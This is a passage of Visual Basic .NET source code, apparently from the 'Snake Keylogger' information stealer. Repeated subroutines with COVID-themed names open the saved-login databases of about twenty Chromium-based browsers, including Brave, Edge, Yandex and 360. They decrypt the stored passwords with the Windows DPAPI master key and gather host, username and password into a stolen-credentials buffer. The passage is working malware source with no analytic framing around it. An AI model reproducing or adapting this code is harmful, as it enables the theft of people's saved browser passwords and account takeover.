
                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Chromium" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDSTGhost()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\GhostBrowser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Ghost" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTCent()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\CentBrowser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Cent" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTxVast()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Xvast\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: xVast" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTChedot()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Chedot\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Chedot" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTSuperbird()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\SuperBird\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Superbird" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDST360_English()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\360Browser\Browser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: 360" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDST360_China()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\360Chrome\Chrome\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: 360" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTComodo()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Comodo\Dragon\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Comodo" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTBrave()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\BraveSoftware\Brave-Browser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Brave" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTTorch()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Torch\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Torch" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDSTUC()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\UCBrowser\User Data_i18n\Default\UC Login Data.18"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("wow_logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: UC" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTBlisk()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Blisk\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Blisk" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDSTEpic()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Epic Privacy Browser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Epic" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTYandex()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Yandex\YandexBrowser\User Data\Default\Ya Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Yandex" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDSTNichrome()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Nichrome\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Nichrome" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub


    Public Sub COVIDSTAmigo()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Amigo\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Amigo" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTKometa()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Kometa\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Kometa" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub
    Public Sub COVIDSTXpom()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Xpom\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Xpom" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTElements()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Elements Browser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Elements" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTMicrosoft()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Microsoft\Edge\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Edge Chromium" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

#End Region

#Region "Chromuim Based Decryption"

    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)>
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
